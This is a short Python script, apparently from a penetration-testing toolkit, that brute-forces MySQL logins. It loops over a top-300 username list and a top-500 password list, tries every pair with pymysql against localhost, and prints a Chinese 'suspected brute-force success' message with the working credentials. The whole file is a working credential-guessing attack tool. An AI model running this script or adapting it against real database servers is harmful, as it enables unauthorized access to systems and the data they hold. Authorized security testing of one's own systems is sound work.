import pymysql


def blast():
    with open('../dict/u&p/username_top300.txt') as u:
        user_list = u.readlines()
    with open('../dict/u&p/password_top500.txt') as p:
        pswd_list = p.readlines()
    for username in user_list:
        for password in pswd_list:
            try:
                pymysql.connect(host='localhost', user=f"{username.split()[0]}", password=f"{password.split()[0]}")
                print(f"疑似爆破成功\n用户名：{username.split()}\n密码：{password.split()}")
                return
            except:
                pass


if __name__ == '__main__':
    blast()
